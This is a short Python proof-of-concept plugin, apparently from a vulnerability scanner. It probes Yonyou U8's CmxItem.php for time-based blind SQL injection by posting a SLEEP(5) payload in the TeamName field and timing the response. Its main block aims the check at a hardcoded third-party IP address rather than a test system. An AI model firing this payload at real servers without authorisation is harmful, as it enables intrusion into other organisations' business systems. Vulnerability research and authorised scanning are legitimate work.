#/usr/bin/python
#-*- coding: utf-8 -*-
#refer:http://www.wooyun.org/bugs/wooyun-2015-0152899

import re
import time

def assign(service, arg):
    if service == "yonyou_u8":
        return True, arg 	

def audit(arg):
    payload = "Server/CmxItem.php?pgid=System_UpdateSave"
    url = arg + payload
    postpayload ="TeamName=test' AND (SELECT * FROM (SELECT SLEEP(5))usqH)%23"
    time0 = time.time()
    code, head, res, errcode, _ = curl.curl2(url, postpayload)
    time1 = time.time()
    code, head, res, errcode, _ = curl.curl2(url)
    time2 = time.time()
    if ((time1 - time0) - (time2 - time1)) >= 4:
        security_hole(url + '   sql injection!')
            
if __name__ == '__main__':
    from dummy import *
    audit(assign('yonyou_u8', 'http://221.224.116.210:81/')[1])